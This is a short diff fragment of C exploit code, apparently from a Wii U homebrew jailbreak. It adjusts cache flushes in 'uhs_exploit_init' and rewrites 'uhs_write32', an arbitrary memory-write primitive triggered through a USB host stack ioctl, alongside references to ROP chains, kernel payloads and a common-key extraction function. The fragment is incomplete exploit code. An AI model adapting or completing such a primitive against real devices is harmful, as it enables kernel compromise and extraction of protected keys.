@@ -337,22 +337,21 @@ static inline void uhs_exploit_init()
 	// Push data out of PPC cache to RAM
 	DCFlushRange(ayylmao + 5, 4);
 	DCFlushRange(ayylmao + 8, 4);
-	DCFlushRange(pretend_root_hub + 33, 200);
+	DCFlushRange(pretend_root_hub + 33, 4);
+	DCFlushRange(pretend_root_hub + 78, 4);
 	DCFlushRange(ADDY_SC, sizeof(second_chain));
 	DCFlushRange(ADDY_FC, sizeof(final_chain));
 	DCFlushRange(ADDY_AK, sizeof(arm_kernel_bin));
 	DCFlushRange(ADDY_AU, sizeof(arm_user_bin));
 }
 
-static void uhs_write32(int *buffer, int arm_addr, int val, int uhs)
-{
-	ayylmao[520] = arm_addr - 24;			// The address to be overwritten, minus 24 bytes
-	DCFlushRange(ayylmao + 520, 4);			// Push data out of PPC cache to RAM
-	OSSleepTicks(0x200000);					// Improves stability
-	buffer[0] = -(0xBEA2C);
-	buffer[1] = val;
+#define uhs_write32(buffer, arm_addr, val, uhs) \
+	ayylmao[520] = arm_addr - 24;				\
+	DCFlushRange(ayylmao + 520, 4);				\
+	OSSleepTicks(0x200000);						\
+	buffer[0] = -(0xBEA2C);						\
+	buffer[1] = val;							\
 	IOS_Ioctl(uhs, 0x15, buffer, 2, buffer, 32);
-}
 
 uint8_t *getCommonKey()
 {
